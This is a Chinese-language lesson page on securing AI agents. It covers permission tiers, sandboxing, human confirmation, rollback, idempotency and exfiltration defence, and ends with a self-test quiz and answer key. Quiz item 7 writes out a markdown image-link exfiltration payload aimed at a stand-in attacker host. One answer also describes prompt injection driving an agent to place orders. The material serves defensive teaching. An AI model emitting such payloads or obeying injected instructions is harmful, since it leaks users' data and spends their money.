# C23-5 · 速查表与自测
> 阅读约 12 分钟。目标：把安全四件事的核心结论固化成一页，并用自测检验。

## 速查表

### 权限四级

| 级别 | 含义 | 默认确认 |
|---|---|---|
| `read` 只读 | 只能查 | 否 |
| `write` 写 | 能改 | 按影响面 |
| `spend` 花钱 | 扣钱 / 消耗资源 | 是 |
| `destroy` 破坏 | 不可逆 / 高影响 | 是 |

> 职责互斥：读数据的和能花钱的不该是同一个 Agent（C16-1），中间隔确认。

### 沙箱

- 模型生成代码 = 不可信输入，默认隔离运行。
- 三种实现：Docker（高隔离）/ 受限解释器（轻）/ WASM（跨语言）。
- 逃逸多因配置松：先堵挂载、网络、密钥、root 四个口子。
- 资源限制四件套：CPU / 内存 / 网络 / 超时。

### 人工确认（HITL）

- 必确认：花钱、删数据、对外发消息、不可逆写。
- 问太多会麻木 → 批量确认 + 分级 + 计划先审。
- 确认展示三件套：动作、依据、影响面（靠 trace）。
- 确认要绑参数快照，执行前再校验一次；超时默认拒绝。
- 确认通过率长期 > 98% = 已在盲签，该合并而不是继续加框。

### 系统稳定性与防外泄

- 系统层 ≠ 单次调用层（C5 管单次，本篇管长链）。
- 长任务：总预算 + 检查点 + 心跳。
- 幂等键只给有副作用的写操作。
- 部分失败：补偿事务逆序回滚；不能回滚就记状态留人工。
- 防外泄：收数据面 → 校外发内容 → 留审计日志。
- 外泄四通道：图片 URL、链接参数、文件名元数据、错误回显——靠出站白名单 + 渲染剥离，别靠敏感词。

### 上线前安全自查（10 项）

- [ ] 每个工具都标了权限级（read / write / spend / destroy）
- [ ] `spend` / `destroy` 走确认，卡片含动作、依据、影响面
- [ ] 确认绑定了参数快照，执行前校验未变
- [ ] 确认超时默认拒绝（不是自动通过）
- [ ] 模型生成的代码在沙箱跑，已封网络与挂载
- [ ] 工具用最小权限账号，不拿主库账号
- [ ] 出站有域名白名单；渲染前剥离外部图片与链接
- [ ] 日志脱敏在写入端完成
- [ ] 长任务有总预算、检查点、心跳
- [ ] 有副作用的写操作都带幂等键

## 自测题

> 答对 6 道以上，可以进阶段 6。

1. 「只读」和「写」为什么不放在同一个权限级？读数据的和能花钱的为什么不该是同一个 Agent？
2. 把 `eval` 换成 `ast` 白名单，是不是就安全了？为什么？
3. 为什么确认问得太频繁反而更危险？
4. 一个任务跑了三步写操作、第三步失败，前两步怎么办？幂等键给谁加、不给谁加？
5. 数据外泄的根子在哪？防外泄的三道防线是什么？
6. 确认卡片生成后 10 分钟用户才点「同意」，为什么可能执行了另一个操作？怎么防？
7. 回答里出现 `![](https://evil.example/p?d=...)` 意味着什么？为什么敏感词过滤拦不住？

## 参考答案要点

1. 只读错了还能查，写错了改不回来，风险量级不同所以要分级。读和花钱不放在同一个 Agent，是因为 prompt 注入一旦成功，攻击者能让它「查完价直接下单」；拆开并在中间加确认，才能隔离风险（职责互斥，见 C16-1）。
2. 不安全。`ast` 白名单只拦住表达式层面的注入，管不住 `open` 读文件、`import os`、网络请求。模型生成代码要默认当不可信输入，整个执行环境隔离（沙箱）才是根本，换掉 `eval` 只是导火索。
3. 确认的价值与频率成反比：问多了人会变成条件反射式「一直点同意」，确认就形同虚设。应该用批量确认、分级、计划先审来控频率。
4. 前两步按逆序补偿回滚（给每个写操作准备逆操作）；不能回滚就标记「部分完成」留人工处理。幂等键只给「有副作用的写操作」（下单 / 发短信 / 扣款），纯读和纯计算天然幂等，别加。
5. 根子在「工具的数据面太宽」——工具能读到什么，就可能泄什么。三道防线：最小化工具数据面（只给需要的列和只读账号）、外发内容校验（发前过敏感词 / 格式）、审计日志（复用 C19 的 trace）。
6. 因为确认和执行之间有时差：等待期间 Agent 可能被重试逻辑重跑，参数已经变了（order 42 变成 42–52）。人批准的是一个动作，执行的是另一个。防法：确认时冻结参数快照，执行前用 `action_hash` 再校验一次，不一致就要求重新确认；同时超时默认拒绝。
7. 意味着一次典型的外泄尝试：前端自动加载该图片，请求带着敏感数据进了对方的访问日志。敏感词过滤拦不住，因为数据被编码进 URL、不含任何「敏感词」；应靠出站域名白名单 + 渲染前剥离外部图片与链接。
